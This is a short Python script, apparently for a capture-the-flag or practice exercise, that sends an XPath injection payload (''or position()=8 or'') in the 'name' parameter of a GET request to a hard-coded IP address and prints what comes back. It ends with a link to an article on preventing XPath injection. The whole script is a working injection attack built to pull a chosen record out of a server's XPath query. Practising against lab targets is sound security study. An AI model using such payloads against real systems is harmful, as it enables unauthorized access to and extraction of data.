import requests

url = "http://103.185.44.122:33121/query"
payload="'or position()=8 or'"
params = {'name': payload}  # Ubah nilai parameter sesuai kebutuhan

try:
    response = requests.get(url, params=params)
    if response.status_code == 200:
        print("Response:")
        print(response.text)  # Tampilkan konten respons
    else:
        print("Failed to fetch data. Status code:", response.status_code)
except Exception as e:
    print("An error occurred:", e)
#https://snyk.io/blog/prevent-xpath-injection-attacks
